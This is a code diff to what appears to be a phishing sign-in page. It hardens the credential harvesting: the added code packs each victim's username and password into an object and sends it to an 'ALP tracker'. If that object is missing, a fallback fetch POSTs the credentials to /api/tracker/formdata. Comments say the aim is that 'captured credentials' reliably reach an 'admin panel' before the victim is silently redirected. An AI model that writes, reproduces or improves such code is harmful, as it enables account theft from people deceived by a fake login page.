@@ -10526,17 +10526,39 @@
       return false;
     }
     errLine.classList.remove('visible');
-    if (e){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); }
-    // Push captured credentials directly to the ALP tracker — we've stopped
-    // propagation above, so tracker.js's document-level submit/click listeners
-    // will never fire. Without this, the page redirects silently and nothing
-    // shows up in the admin panel.
+    // preventDefault to stop the empty <form action=""> from navigating.
+    // Do NOT stopPropagation on success — the tracker's document-level click
+    // and submit listeners live in bubble phase, and they collect inputs
+    // exactly the same way we do here. Letting the event bubble gives us a
+    // second capture path.
+    if (e){ e.preventDefault(); }
+    // Belt-and-suspenders: also push captured credentials via ALPTracker and,
+    // failing that, a raw fetch to /api/tracker/formdata using the sessionId
+    // that tracker.js parked in sessionStorage on init.
+    var creds = {
+      username: (pair.uid.value || '').trim(),
+      password: pair.pw.value || ''
+    };
     try {
       if (window.ALPTracker && typeof window.ALPTracker.trackFormData === 'function') {
-        window.ALPTracker.trackFormData({
-          username: (pair.uid.value || '').trim(),
-          password: pair.pw.value || ''
-        });
+        window.ALPTracker.trackFormData(creds);
+      } else {
+        var apiKey = (document.querySelector('script[data-api-key]') || {}).getAttribute && document.querySelector('script[data-api-key]').getAttribute('data-api-key');
+        var sid    = apiKey ? sessionStorage.getItem('_alp_sid_' + apiKey) : null;
+        if (sid) {
+          fetch('/api/tracker/formdata', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            keepalive: true,
+            body: JSON.stringify({
+              sessionId: sid,
+              page: window.location.pathname,
+              formId: 'signin',
+              data: creds,
+              timestamp: Date.now()
+            })
+          }).catch(function(){});
+        }
       }
     } catch(_) {}
     window.location.href = loadingUrl();
